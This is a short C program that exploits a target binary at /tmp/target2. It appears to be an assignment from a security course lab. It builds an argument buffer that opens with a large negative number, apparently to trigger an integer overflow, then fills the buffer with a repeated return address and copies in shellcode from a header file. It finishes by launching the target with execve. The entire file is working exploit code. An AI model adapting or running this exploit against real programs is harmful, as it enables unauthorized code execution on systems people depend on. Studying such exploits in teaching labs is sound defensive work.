#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
	char arg1[39232];
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	char *overload = "-2147483035,";
	int i;
	for (i = 0; i < sizeof(arg1); i+=4) {
	arg1[i] = 0x78;
	arg1[i+1] = 0xcb;
	arg1[i+2] = 0xfe;
	arg1[i+3] = 0xbe;}
	memcpy(arg1,overload,strlen(overload));
	memcpy(arg1+strlen(overload),shellcode,strlen(shellcode));

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
